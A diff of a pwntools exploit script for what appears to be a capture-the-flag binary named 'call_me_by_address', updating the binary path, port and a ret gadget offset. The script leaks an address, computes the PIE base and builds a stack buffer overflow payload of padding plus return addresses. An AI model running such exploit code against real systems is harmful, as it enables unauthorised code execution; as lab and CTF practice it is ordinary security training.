@@ -1,10 +1,10 @@
 #!/usr/bin/env python3
 from pwn import *
 
-exe = context.binary = ELF(args.EXE or './call_me_by_address')
+exe = context.binary = ELF(args.EXE or '../pub/call_me_by_address')
 
 host = args.HOST or '127.0.0.1'
-port = int(args.PORT or 8889)
+port = int(args.PORT or 10000)
 
 def start_local(argv=[], *a, **kw):
     if args.GDB:
@@ -32,7 +32,7 @@ leak = int(io.recvuntil(b"\n").strip().ljust(8,b"\x00"),16)
 base = leak - exe.symbols.bob
 
 me = base + exe.symbols.me
-ret = 0x0000000000001016
+ret = 0x000000000000101a
 
 payload = b"A"*40
 payload+= p64(base+ret)
